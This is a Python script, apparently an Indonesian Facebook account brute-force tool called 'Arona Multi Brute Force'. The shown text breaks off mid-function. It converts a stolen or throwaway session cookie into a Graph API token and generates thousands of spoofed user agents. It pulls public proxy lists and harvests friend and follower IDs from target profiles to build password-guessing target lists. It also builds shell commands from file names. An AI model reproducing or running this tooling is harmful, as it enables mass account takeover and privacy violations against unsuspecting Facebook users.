# Author by HikmatXD
# Jangan Keras Merecode Script Kami!!! 
# https://github.com/HIKMAT-xyz
# Jangan lupa follow github saya:)
     
     # Corporation Arona Multi Brute Force
     # Tricker Not Hacker
     # Fb : Hikmat Ceremony Queenz Sr.
     # Whastapp : 082115413282

import requests,bs4,rich,os,sys,random,re,datetime,time,json,stdiomask

from concurrent.futures import ThreadPoolExecutor as tread
from bs4 import BeautifulSoup as sop
from rich.panel import Panel as panel
from rich import print as vprint
from random import randint
from time import sleep as turu

FR = {'1':'januari','2':'februari','3':'maret','4':'april','5':'mei','6':'juni','7':'juli','8':'agustus','9':'september','10':'oktober','11':'november','12':'desember'}
tgl = datetime.datetime.now().day
bln = FR[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
cpz = "CP-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
okz = "OK-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
id,loop,id2,metode,uid,ok,cp,ua_crack,id3,id4,idez,HikmatXD,akun=[],0,[],[],[],0,0,[],[],[],[],0,[]
pw_ni,pw_tambahan,pw_belakang,pw_lu,tampilkan_ttl,tampilkan_apk,tampilkan_opsi=[],[],[],[],[],[],[]

for xyzx in range(1000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
	if ugent1 in ua_crack:pass
	else:ua_crack.append(ugent1)
	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
	if ugent2 in ua_crack:pass
	else:ua_crack.append(ugent2)
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
	if ugent3 in ua_crack:pass
	else:ua_crack.append(ugent3)
	
for xnxx in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ua_crack.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ua_crack.append(uaku2)

for yzirx in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

try:ua_crack=open("useragent.txt","r").read().splitlines()
except:ua_crack=["nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+","Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]"]

m_fb = "m.facebook.com"
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
web_fb = "https://www.facebook.com/"
head_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

#ua_crack = open("useragent_hikmat.txt","r").read().splitlines()

def clear():
	os.system('clear')
def jalan(xnxx):
	for ewe in xnxx + '\n':
		sys.stdout.write(ewe);sys.stdout.flush();turu(0.05)

def proxp():
	try:
		proxf = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
		open('proxy_mat.txt','w').write(proxf)
	except Exception as e:
		print('Failed')
	proxf = open('proxy_mat.txt','r').read().splitlines()


P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati
o = '\033[1;36m'

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
warna_warni_rich=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
warna_warni_rich_cerah=random.choice([J3,K3,H3,O3,N3,U3,B3])
garis = f" {P}[{H}•{P}]"

now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

def banner():
	os.system("clear")
	print(f"""
\t   _____      _____   __________ ___________
\t  /  _  \    /     \  \______   \\_   _____/
\t /  /_\  \  /  \ /  \  |    |  _/ |    __)  
\t/    |    \/    Y    \ |    |   \ |     \   
\t\____|__  /\____|__  / |______  / \___  /   
\t        \/         \/         \/      \/ • Arona Multi Brute Force •
\t\t{garis} author by {K}HikmatXD
""")

def cek_cookie():
	try:
		token  = open('token.txt','r').read()
		cookie = {'cookie':open('cookie.txt','r').read()}
		try:
			token  = open('token.txt','r').read()
			cookie = {'cookie':open('cookie.txt','r').read()}
			kook = open('cookie.txt','r').read()
			get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
			gut = json.loads(get.text)
			xname = gut["name"]
			x=f"{P2}{kook}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			x=f"\t\t{P2}cookie {H2}{xname} {P2}belum invalid"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(f"{garis} enter untuk ke menu ")
			menu()
		except (KeyError):
			x=f"\t\t{P2}cookie kadaluarsa"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			os.system('rm -rf cookie.txt')
			os.system('rm -rf token.txt')
			turu(0.05)
			login()
		except requests.exceptions.ConnectionError:
			x=f"\t\t{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			exit()
	except IOError:
		login()

def login():
	banner()
	x=f"{P2}halo pengguna script arona multi brute force :)\n{P2}silahkan pilih fitur login cookie untuk melanjutkan ke menu arona multi brute force.. klo tidak mengerti apa² bisa ketik {M2}help {P2}untuk meminta bantuan !!"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	print("")
	x=f"{P2}[01] login with cookie\n{P2}[02] report bug script\n{P2}[{M2}00{P2}] exit "
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cukuf = input(f" {P}[{H}•{P}] pilih : {H}")
	if cukuf in ["help","Help","HELP"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo ada kepentingan yang mau disampaikan ke author ambf\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		os.system('xdg-open https://wa.me/+6282115413282?text=bang+cara+pake+script+abang+kek+mana?')
		input(f" {P}[{H}•{P}] kembali")
		login()
	elif cukuf in ["1","01"]:
		login_cookie()
	elif cukuf in ["2","02"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo memang ada yang error\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		os.system('xdg-open https://wa.me/+6282115413282?text=bang+script+mu+itu+ada+yang+error!!')
		input(f" {P}[{H}•{P}] kembali")
		login()
	elif cukuf in ["0","00"]:
		exit()
	else:
		print("")
		jalan(f"{garis} isi yang benar!! ")
		login()

def login_cookie():
	print("")
	#testi_ua()
	x = f"\t\t{P2}jangan pake akun pribadi!! harus pake akun tumbal untuk ambil cookie"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cookie = str(input(f"{garis} masukkan cookie :"+H+" "))
	with requests.Session() as xyz:
		try:
			jalan(f"{garis} sedang mengconvert cookie ke token... mohon tunggu ")
			get_tok = xyz.get(url_businness+'/business_locations',headers = {"user-agent":ua_business,"referer": web_fb,"host": "business.facebook.com","origin": url_businness,"upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
			token = re.search("(EAAG\w+)", get_tok.text).group(1)
			open('cookie.txt','w').write(cookie) 
			open('token.txt','w').write(token)
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			turu(0.05)
			#input(f"{garis} enter untuk ke menu ")
			menu()
		except requests.exceptions.ConnectionError:
			x=f"\t\t{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		except (KeyError,IOError):
			x=f"\t\t{P2}{cookie} invalid"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			os.system("rm -rf cookie.txt")
			os.system("rm -rf token.txt")
			login() 
		
now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"

def menu():
	banner()
	try:EwePaksa = requests.get("http://ip-api.com/json/").json()
	except:EwePaksa = {'-'}
	try:IP = EwePaksa["query"]
	except:IP = {'-'}
	try:nibba = EwePaksa["country"]
	except:nibba = {'-'}
	try:rasis_Z_K_= EwePaksa["isp"]
	except:rasis_Z_K_ = {'-'}
	try:rasis_Z_K_X_= EwePaksa["city"]
	except:rasis_Z_K_X_ = {'-'}
	try:rasis_Z_K_X_R_= EwePaksa["timezone"]
	except:rasis_Z_K_X_R_ = {'-'}
	try:rasis_Z_K_X_R_H_= EwePaksa["countryCode"]
	except:rasis_Z_K_X_R_H_ = {'-'}
	try:rasis_Z_K_X_R_H_M_= EwePaksa["regionName"]
	except:rasis_Z_K_X_R_H_M_ = {'-'}
	try:rasis_Z_K_X_R_H_M_P_= EwePaksa["as"]
	except:rasis_Z_K_X_R_H_M_P_ = {'-'}
	token  = open('token.txt','r').read()
	cookie = {'cookie':open('cookie.txt','r').read()}
	get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
	jsx = json.loads(get.text)
	nama = jsx["name"]
	tumbal_id = jsx["id"]
	xn = requests.Session().get('https://graph.facebook.com/me?access_token=%s'%(token),cookies=cookie)
	x = json.loads(xn.text)
	lis = x["link"]
	try:co = x["email"]
	except (KeyError,IOError):
		co = M+"-"+P
	try:pko = x["birthday"]
	except (KeyError,IOError):
		pko = M+"-"+P
	try:no_kep = x["mobile_phone"]
	except (KeyError,IOError):
		no_kep = M+"-"+P
	try:lok = x["locale"]
	except (KeyError,IOError):
		lok = M+"-"+P
	print("")
	x=f"\t\t{P2}{hhl} {K2}{nama}\n\t\t{P2}tanggal lahirmu : {H2}{pko}\n\t\t{P2}ID kamu : {H2}{tumbal_id}\n\t\t{P2}IP kamu : {H2}{IP}\n\t\t{P2}negara kamu : {H2}{nibba}\n\t\t{P2}tanggal sekarang : {H2}{sekarang}"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	print("")
	x=f"{P2}[01] crack with public\n{P2}[02] hasil crack\n{P2}[{M2}00{P2}] exit/delete cookie"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	HikmatXD = input(f"{garis} pilih : {H}")
	if HikmatXD in ["1","01"]:
		cracked_publickey()
	elif HikmatXD in ["2","02"]:
		hasil_crack()
	elif HikmatXD in ["0","00"]:
		print("")
		x=f"{P2}[01] hapus cookie\n{P2}[02] exit\n{P2}[{H2}00{P2}] kembali"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		zk = input(f"{garis} pilih : {H}")
		if zk in ["1","01"]:
			print("")
			c = input(f"{garis} anda yakin ingin menghapus cookie ({M}y{P}/{H}t{P}) : {H}")
			if c in ["ya","y","Y"]:
				print("")
				os.system("rm -rf cookie.txt")
				os.system("rm -rf token.txt")
				jalan(f"{garis} sukses menghapus cookie bawaan ")
				cek_cookie()
			elif c in ["t","T","tidak"]:
				menu()
			else:
				print("")
				jalan(f"{garis} isi yang benar ")
				menu()
		elif zk in ["2","02"]:
			exit()
		elif zk in ["0","00"]:
			menu()
		else:
			print("")
			jalan(f"{garis} isi yang benar ")
			menu()
	else:
		print("")
		jalan(f"{garis} isi yang benar ")
		menu()

def hasil_crack():
	print("")
	x=f"{P2}[01] lihat hasil crack {H2}ok\n{P2}[02] lihat hasil crack {K2}cp\n{P2}[{H2}03{P2}] kembali"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	inhasil = input(f"{garis} pilih : {H}")
	if inhasil in ["1","01"]:
		try:c_o_k = os.listdir('OK')
		except FileNotFoundError:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		if len(c_o_k)==0:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		else:
			x=f"\t\t{P2} hasil ok"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:hikmat = open('OK/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
			x=f"{P2}pilih hasil untuk ditampilkan"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			geeh = input(garis+" pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				print(garis+" pilihan tidak ada")
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				jalan(garis+" file tidak ditemukan") 
				time.sleep(2)
				hasil_crack()
			jalan(garis+" list akun ok kamu\n") 
			#x=f"{P2}cd OK*-->{geh}"
			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			hus = os.system('cd OK && cat '+geh)
			jalan("\n"+garis+" list akun ok kamu") 
			input(garis+" kembali")
			menu()
	elif inhasil in ["2","02"]:
		try:c_o_k = os.listdir('CP')
		except FileNotFoundError:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		if len(c_o_k)==0:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_crack()
		else:
			x=f"\t\t{P2} hasil cp"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:hikmat = open('CP/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
			x=f"{P2}pilih hasil untuk ditampilkan"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			geeh = input(garis+" pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				print(garis+" pilihan tidak ada")
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				jalan(garis+" file tidak ditemukan") 
				time.sleep(2)
				hasil_crack()
			jalan(garis+" list akun cp kamu\n") 
			#x=f"{P2}cd CP*-->{geh}"
			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			hus = os.system('cd CP && cat '+geh)
			jalan("\n"+garis+" list akun cp kamu") 
			input(garis+" kembali")
			menu()
	elif inhasil in ["0","00"]:
		menu()
	else:
		jalan(f"{garis} isi yang benar ")
		hasil_crack()

def cracked_publickey():
	print("")
	x=f"{P2}ketik {H2}y{P2} untuk crack massal public\n{P2}ketik {H2}t{P2} untuk crack public"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cuy = input(f"{garis} apakah anda ingin crack massal ({H}y{P}/{M}t{P}) ? : {H}")
	if cuy in ["y","Y"]:
		massal_cracked_public()
	elif cuy in ["t","T"]:
		cracked_public()
	elif cuy in ["g","G"]:
		cracked_email()
	else:
		jalan(f"{garis} isi yang benar ")
		cracked_publickey() 

def cracked_email():
	x = 0
	print("")
	n=f"{P2}[01] domain @gmail.com\n{P2}[02] domain @yahoo.com\n{P2}[03] domain @hotmail.com\n{P2}[04] domain @outlook.com"
	vprint(panel(n,style=f"{warna_warni_rich_cerah}"))
	sae = input(f"{garis} pilih : {H}")
	if sae in["1"]:
		email = "@gmail.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	elif sae in["2"]:
		email = "@yahoo.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	elif sae in["3"]:
		email = "@hotmail.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	elif sae in["4"]:
		email = "@outlook.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	settingers()

def massal_cracked_public():
	print("")
	x=f"\t\t{P2}target harus public & banyak friends nya"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	try:
		jum = int(input(garis+" mau berapa id :"+H+" "))
	except ValueError:
		jalan(garis+" yang kamu ketik itu bukan nomor")
		menu()
	if jum<1 or jum>20:
		jalan(garis+" kesalahan yang tidak terduga")
		menu()
	ses=requests.Session()
	yz = 0
	x=f"\t\t{P2}ketik {H2}me{P2} untuk crack dari pertemanan"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	for met in range(jum):
		yz+=1
		kl = input(garis+" masukan id ke "+H+str(yz)+P+" :"+H+" ")
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(kl,token),cookies=coki)
		el = json.loads(coa.text)
		try:lk = el["name"]
		except (KeyError,IOError):
			lk = M+"-"+P
		ooi = requests.get('https://graph.facebook.com/%s?access_token=%s'%(kl,token),cookies=coki)
		oer = json.loads(ooi.text)
		try:pok = oer["locale"]
		except (KeyError,IOError):
			pok = M+"-"+P
		id8 = []
		id9 = []
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(kl,token),cookies=coki).json()
		for fuck in cyna['friends']['data']:
			try:id8.append(fuck['id']+'|'+fuck['name'])
			except:continue
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(5000)&access_token=%s'%(kl,token),cookies=coki).json()
		for fuck in cyna['subscribers']['data']:
			try:id9.append(fuck['id']+'|'+fuck['name'])
			except:continue
		x=f"{P2}nama target : {H2}{lk}\n{P2}friends total : {H2}{len(id8)}\n{P2}followers total : {H2}{len(id9)}\n{P2}lokasi target akun : {H2}{pok}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		uid.append(kl)
		idez.append(kl)
	for yuk in idez:
		try:
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(yuk,token),cookies=coki)
			el = json.loads(coa.text)
			try:lk = el["name"]
			except (KeyError,IOError):
				lk = M+"-"+P
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(99999)&access_token=%s'%(yuk,token),cookies=coki).json()
			for fuck in cyna['subscribers']['data']:
				try:id3.append(fuck['id']+'|'+fuck['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			jalan(garis+" koneksi internet bermasalah ")
			exit()
	for userr in uid:
		try:
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(userr,token),cookies=coki)
			el = json.loads(coa.text)
			try:lk = el["name"]
			except (KeyError,IOError):
				lk = M+"-"+P
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(userr,token),cookies=coki).json()
			for fuck in cyna['friends']['data']:
				try:id.append(fuck['id']+'|'+fuck['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			jalan(garis+" koneksi internet bermasalah ")
			exit()
	if len(id) or len(id3)==0:
		x=f"{P2}total friends : {H2}{len(id)}\n{P2}total followers : {H2}{len(id3)}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	else:
		x=f"{P2}total friends : {H2}{len(id)}\n{P2}total followers : {H2}{len(id3)}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	settingers()

def cracked_public():
	print("")
	x=f"\t\t{P2}target harus public & banyak friends nya"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	x=f"\t\t{P2}ketik {H2}me{P2} untuk crack dari pertemanan"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	put = input(garis+" target id public :"+H+" ")
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki)
		el = json.loads(coa.text)
		try:lk = el["name"]
		except (KeyError,IOError):
			lk = M+"-"+P
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
		for fuck in cyna['friends']['data']:
			try:id.append(fuck['id']+'|'+fuck['name'])
			except:continue
